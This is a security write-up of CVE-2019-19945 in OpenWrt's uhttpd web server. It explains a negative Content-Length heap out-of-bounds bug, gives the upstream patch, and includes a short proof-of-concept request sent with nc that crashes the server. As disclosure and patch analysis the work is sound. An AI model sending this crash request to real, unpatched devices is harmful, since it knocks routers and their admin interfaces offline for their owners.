# OpenWrt uhttpd DoS Writeup

[LevitatingLion](https://twitter.com/LevitatingLion) found a bug in uhttpd, leading to out-of-bounds access to a heap buffer and subsequent crash. The bug was reported to OpenWrt and assigned [CVE-2019-19945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19945), OpenWrt published a [security advisory](https://openwrt.org/advisory/2020-01-13-1) as well. The issue was fixed in OpenWrt version 18.06.6, and had been present in all prior versions since January 2013.

The bug can be triggered with an HTTP POST request to a CGI script specifying both `Transfer-Encoding: chunked` and a large negative `Content-Length`. The negative content length is assigned to `r->content_length` in `client_parse_header` (client.c, line 348) and passed as a negative read length to `ustream_consume` in `client_poll_post_data` (client.c, line 426).

Below you find a detailed explanation of the bug, the proof of concept and OpenWrt's patch.

## The Bug

The bug was in `client_parse_header` ([client.c, line 347](https://git.openwrt.org/?p=project/uhttpd.git;a=blob;f=client.c;h=5913553999eac795dacf68c1adc63355e329d2bc;hb=6b03f9605323df23d12e3876feb466f53f8d50c4#l347)):

```c
} else if (!strcmp(data, "content-length")) {
    r->content_length = strtoul(val, &err, 0);
    if (err && *err) {
        uh_header_error(cl, 400, "Bad Request");
        return;
    }
} else if (!strcmp(data, "transfer-encoding")) {
```

`strtoul` is used to parse the content length, which returns an `unsigned long`. However, it is assigned to `r->content_length`, which is an `int`, so the value assigned may actually be negative. `r->content_length` is next used in `client_poll_post_data` ([line 405](https://git.openwrt.org/?p=project/uhttpd.git;a=blob;f=client.c;h=5913553999eac795dacf68c1adc63355e329d2bc;hb=6b03f9605323df23d12e3876feb466f53f8d50c4#l405)):

```c
while (1) {
    // ...

    buf = ustream_get_read_buf(cl->us, &len);  // [4], line 410
    // ...

    cur_len = min(r->content_length, len);  // [1], line 417
    if (cur_len) {
        // ...

        r->content_length -= cur_len;  // [3], line 425
        ustream_consume(cl->us, cur_len);  // [2], line 426
        continue;
    }

    if (!r->transfer_chunked)  // [5], line 430
        break;

    // ...

    sep = strstr(buf + offset, "\r\n");  // [6], line 436

    // ...
}
```

The negative `r->content_length` is always smaller than the positive `len` of the buffer at \[1\], so the negative value is passed to `ustream_consume` at \[2\]. This makes the internal ustream buffer point out-of-bounds. On the next iteration of the outer loop, `ustream_get_read_buf` retrieves this out-of-bounds pointer at \[4\]. The if-clause is skipped, because `r->content_length` is now zero (it was subtracted from itself at \[3\]). The request specified `Transfer-Encoding: chunked`, so the `break` at \[5\] is skipped and the call to `strstr` at \[6\] is reached, which dereferences the out-of-bounds pointer, causing a crash.

## Proof of Concept

```sh
$ cat crash.poc    # crlf line endings, ends with 3 line endings
POST /cgi-bin/luci HTTP/1.0
Transfer-Encoding: chunked
Content-Length: -100000


$ mkdir -p cgi-bin; touch cgi-bin/luci; chmod +x cgi-bin/luci    # create cgi script
$ ./uhttpd -f -p 127.0.0.1:8000 &    # start uhttpd
[1] 748
$ nc 127.0.0.1 8000 < crash.poc    # send poc to uhttpd
[1]+ Segmentation fault (core dumped) ./uhttpd -f -p 127.0.0.1:8000    # uhttpd crashes
$
```

## Impact

As demonstrated by the proof of concept above, this vulnerability can be used to crash uhttpd, leading to denial of service.

Unsuccessful attempts were made to turn this bug from a denial of service into an information leak or authentication bypass. This would be possible if we could make the out-of-bounds pointer point to a previous request on the heap, but that is complicated by two factors:

- The heap layout is hard to control remotely

- The data read out-of-bounds is not returned to the attacker, but passed to the CGI program

Nonetheless it could maybe be possible to make uhttpd "replay" a previous authentication to e.g. luci, given precise timing and an otherwise silent network.

## The Patch

The maintainers of OpenWrt promptly [patched the vulnerability](https://git.openwrt.org/?p=project/uhttpd.git;a=commitdiff;h=5f9ae5738372aaa3a6be2f0a278933563d3f191a), on the same day as it was reported. The bug is fixed by checking that the content length is non-negative after it is parsed:

```diff
--- a/client.c
+++ b/client.c
@@ -346,7 +346,7 @@ static void client_parse_header(struct client *cl, char *data)
                }
        } else if (!strcmp(data, "content-length")) {
                r->content_length = strtoul(val, &err, 0);
-               if (err && *err) {
+               if ((err && *err) || r->content_length < 0) {
                        uh_header_error(cl, 400, "Bad Request");
                        return;
                }
@@ -444,7 +444,7 @@ void client_poll_post_data(struct client *cl)
                ustream_consume(cl->us, sep + 2 - buf);

                /* invalid chunk length */
-               if (sep && *sep) {
+               if ((sep && *sep) || r->content_length < 0) {
                        r->content_length = 0;
                        r->transfer_chunked = 0;
                        break;
```
